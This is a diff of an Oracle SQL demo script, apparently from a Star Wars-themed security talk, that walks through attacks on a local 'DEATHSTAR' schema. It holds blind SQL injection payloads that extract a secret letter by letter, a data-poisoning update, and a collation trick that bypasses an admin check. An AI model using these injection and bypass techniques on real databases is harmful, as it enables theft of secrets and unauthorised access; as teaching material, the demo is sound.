@@ -1,6 +1,6 @@
 /* Run as DEATHSTAR */
 /* 1. Update Injection: Poison a data-table */
-
+#pause
 set echo on
 
 -- Deathstar-rooms before
@@ -19,21 +19,22 @@ select * from deathstar_rooms;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
-
-
-
-
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') from dual;
 #pause
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') from dual;
+
+
+
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
 #pause
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') from dual;
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
+#pause
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
 #pause
 
 -- all ascii chars...
-select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') from dual;
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
 #pause
 
+set serveroutput on
 declare
   l_secret varchar2(4000);
 
@@ -72,7 +73,7 @@ end;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
-
+#pause
 -- Poisoned room-code
 select code from deathstar_rooms;
 #pause
@@ -94,12 +95,12 @@ select * from log_201911;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
-
+#pause
 
 --------------------------
 -- --> AS SABINE
 --------------------------
-connect darth_dba/darth_dba@localhost:1522/ORCLPDB1
+connect sabine/sabine@localhost:1522/ORCLPDB1
 #pause
 create table secret_dump (
   secret varchar2(4000),
@@ -139,6 +140,7 @@ select * from secret_dump;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
+#pause
 
 /* 6. Collation Attack */
 ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
@@ -155,6 +157,7 @@ select deathstar.is_admin('Ädmin') from dual;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
+#pause
 
 create or replace trigger trg_client_detection
 after logon
@@ -216,6 +219,7 @@ select * from user_role_privs;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
+#pause
 
 select * from user_role_privs;
 #pause
@@ -229,6 +233,7 @@ select deathstar.room_info.get_room_id('Vader') from dual;
 --------------------------
 -- --> Continue Darth Ora
 --------------------------
+#pause
 
 
 select * from user_role_privs;
